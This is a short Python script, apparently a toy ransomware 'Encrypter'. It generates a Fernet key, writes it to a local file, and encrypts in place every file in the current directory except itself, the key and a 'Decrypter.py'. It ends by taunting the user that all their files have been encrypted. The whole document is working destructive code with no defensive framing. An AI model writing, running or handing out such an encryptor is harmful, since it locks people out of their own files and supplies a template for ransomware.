import os
from cryptography.fernet import Fernet

encryption_key = Fernet.generate_key()
with open("encryption_key.key", "wb") as encryption_keyfunction:
    encryption_keyfunction.write(encryption_key)

files = []

for file in os.listdir():
    if file == "Encrypter.py" or file == "encryption_key.key" or file == "Decrypter.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(encryption_key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


print("All of your files are have been encrypted, SORRY FELLA!")